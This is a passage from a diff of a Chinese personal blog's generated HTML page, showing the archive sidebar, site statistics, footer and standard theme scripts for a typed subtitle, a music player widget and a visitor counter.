href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 1.1em; color: #999">代理</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      <a class="card-more-btn" href="/archives/"
+            title="查看更多">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/08/">
+            <span class="card-archive-list-date">
+              八月 2025
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/02/">
+            <span class="card-archive-list-date">
+              二月 2025
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2024/12/">
+            <span class="card-archive-list-date">
+              十二月 2024
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2024/10/">
+            <span class="card-archive-list-date">
+              十月 2024
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2024/05/">
+            <span class="card-archive-list-date">
+              五月 2024
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2024/01/">
+            <span class="card-archive-list-date">
+              一月 2024
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2023/11/">
+            <span class="card-archive-list-date">
+              十一月 2023
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2023/10/">
+            <span class="card-archive-list-date">
+              十月 2023
+            </span>
+            <span class="card-archive-list-count">19</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">128</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-06-15T04:37:42.907Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2020 - 2026 By putdown</span></div><div class="footer_custom_text"><div> Welcome to lie down </div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"><script>window.typedJSFn = {
+  init: str => {
+    window.typed = new Typed('#subtitle', Object.assign({
+      strings: str,
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: true,
+      backSpeed: 50,
+    }, null))
+  },
+  run: subtitleType => {
+    if (true) {
+      if (typeof Typed === 'function') {
+        subtitleType()
+      } else {
+        btf.getScript('https://cdn.jsdelivr.net/npm/typed.js@3.0.0/dist/typed.umd.min.js').then(subtitleType)
+      }
+    } else {
+      subtitleType()
+    }
+  },
+  processSubtitle: (content, extraContents = []) => {
+    if (true) {
+      const sub = ["永远不要只满足于世界的表象，要敢于探寻未知的可能。"].slice()
+
+      if (extraContents.length > 0) {
+        sub.unshift(...extraContents)
+      }
+
+      if (typeof content === 'string') {
+        sub.unshift(content)
+      } else if (Array.isArray(content)) {
+        sub.unshift(...content)
+      }
+
+      sub.length > 0 && typedJSFn.init(sub)
+    } else {
+      document.getElementById('subtitle').textContent = typeof content === 'string' ? content :
+        (Array.isArray(content) && content.length > 0 ? content[0] : '')
+    }
+  }
+}
+btf.addGlobalFn('pjaxSendOnce', () => { typed.destroy() }, 'typedDestroy')
+</script><script>function subtitleType () {
+  typedJSFn.processSubtitle(["永远不要只满足于世界的表象，要敢于探寻未知的可能。"])
+}
+typedJSFn.run(subtitleType)</script></div><script src="https://lf6-cdn-tos.bytecdntimes.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting@2.0.1/dist/Meting.min.js"></script><meting-js server="netease" type="playlist" id="811671960" fixed="true" mini="true" autoplay="false" theme="#49b1f5" loop="all" order="random" preload="auto" volume="0.5" mutex="true"></meting-js><script src="/js/widgets.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
